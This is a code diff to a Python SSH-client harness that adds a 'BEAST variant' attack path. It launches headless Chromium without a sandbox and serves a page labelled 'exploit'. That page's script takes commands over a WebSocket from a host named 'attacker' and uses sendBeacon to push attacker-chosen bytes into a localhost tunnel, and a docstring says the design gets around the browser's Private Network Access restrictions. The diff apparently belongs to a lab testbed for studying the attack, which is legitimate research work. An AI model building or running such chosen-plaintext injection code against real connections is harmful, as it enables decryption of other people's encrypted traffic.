@@ -76,6 +76,8 @@ class SSHState:
         self._lock = asyncio.Lock()
         self._negotiated: dict[str, str] = {}
         self._stderr_task: Optional[asyncio.Task] = None
+        self._playwright = None
+        self._browser = None
 
     # -- SSH lifecycle --------------------------------------------------------
 
@@ -267,6 +269,38 @@ class SSHState:
         finally:
             await r.aclose()
 
+    # -- Browser automation (BEAST variant) ------------------------------------
+
+    async def launch_browser(self) -> None:
+        """Launch headless Chromium and navigate to the local exploit page.
+
+        The page is served from the client's own HTTP API on localhost so
+        that ``sendBeacon('http://localhost:6379', ...)`` is a local-to-
+        local request, avoiding Private Network Access restrictions
+        without any Chrome flags.
+        """
+        from playwright.async_api import async_playwright
+
+        self._playwright = await async_playwright().start()
+        self._browser = await self._playwright.chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-dev-shm-usage"],
+        )
+        page = await self._browser.new_page()
+
+        exploit_url = f"http://localhost:{HTTP_PORT}/exploit"
+        for attempt in range(1, 61):
+            try:
+                resp = await page.goto(exploit_url, timeout=5000)
+                if resp and resp.ok:
+                    LOG.info("browser loaded exploit page from localhost")
+                    return
+            except Exception as exc:  # noqa: BLE001
+                if attempt % 10 == 0:
+                    LOG.warning("browser navigate attempt %d: %s", attempt, exc)
+                await asyncio.sleep(1.0)
+        LOG.error("could not load exploit page after 60 attempts")
+
     def status(self) -> dict:
         if self.ssh_proc is None or self.ssh_proc.returncode is not None:
             return {"ssh_connected": False}
@@ -293,12 +327,55 @@ class SSHState:
                 },
             },
             "secret_value_length": len(self.secret_value),
+            "browser_connected": self._browser is not None,
         }
 
 
 # ---------------------------------------------------------------------------
 # HTTP control plane
 # ---------------------------------------------------------------------------
+
+_EXPLOIT_HTML = """\
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<p id="status">Connecting...</p>
+<script>
+var TUNNEL = 'http://localhost:6379';
+var WS_URL = 'ws://attacker:9000/ws';
+var ws;
+function connect() {
+    ws = new WebSocket(WS_URL);
+    ws.onopen = function() {
+        document.getElementById('status').textContent = 'Connected';
+        ws.send(JSON.stringify({ cmd: 'ready' }));
+    };
+    ws.onmessage = function(event) {
+        var msg = JSON.parse(event.data);
+        if (msg.cmd === 'fetch') {
+            var raw = atob(msg.body);
+            var body = new Uint8Array(raw.length);
+            for (var i = 0; i < raw.length; i++) body[i] = raw.charCodeAt(i);
+            navigator.sendBeacon(TUNNEL, new Blob([body], {type: 'text/plain'}));
+            ws.send(JSON.stringify({ cmd: 'done', id: msg.id }));
+        }
+    };
+    ws.onclose = function() {
+        document.getElementById('status').textContent = 'Reconnecting...';
+        setTimeout(connect, 1000);
+    };
+}
+connect();
+</script>
+</body>
+</html>
+"""
+
+
+async def handle_exploit(request: web.Request) -> web.Response:
+    return web.Response(text=_EXPLOIT_HTML, content_type="text/html")
+
 
 async def handle_status(request: web.Request) -> web.Response:
     state: SSHState = request.app["ssh"]
@@ -367,6 +444,7 @@ async def main() -> int:
 
     app = web.Application()
     app["ssh"] = state
+    app.router.add_get("/exploit", handle_exploit)
     app.router.add_get("/status", handle_status)
     app.router.add_post("/send_secret", handle_send_secret)
     app.router.add_post("/set_secret", handle_set_secret)
@@ -377,6 +455,12 @@ async def main() -> int:
     site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
     await site.start()
     LOG.info("HTTP control API listening on 0.0.0.0:%d", HTTP_PORT)
+
+    # Launch browser for the BEAST attack variant.
+    try:
+        await state.launch_browser()
+    except Exception as exc:  # noqa: BLE001
+        LOG.warning("browser launch failed (BEAST variant unavailable): %s", exc)
 
     await asyncio.Event().wait()
     return 0
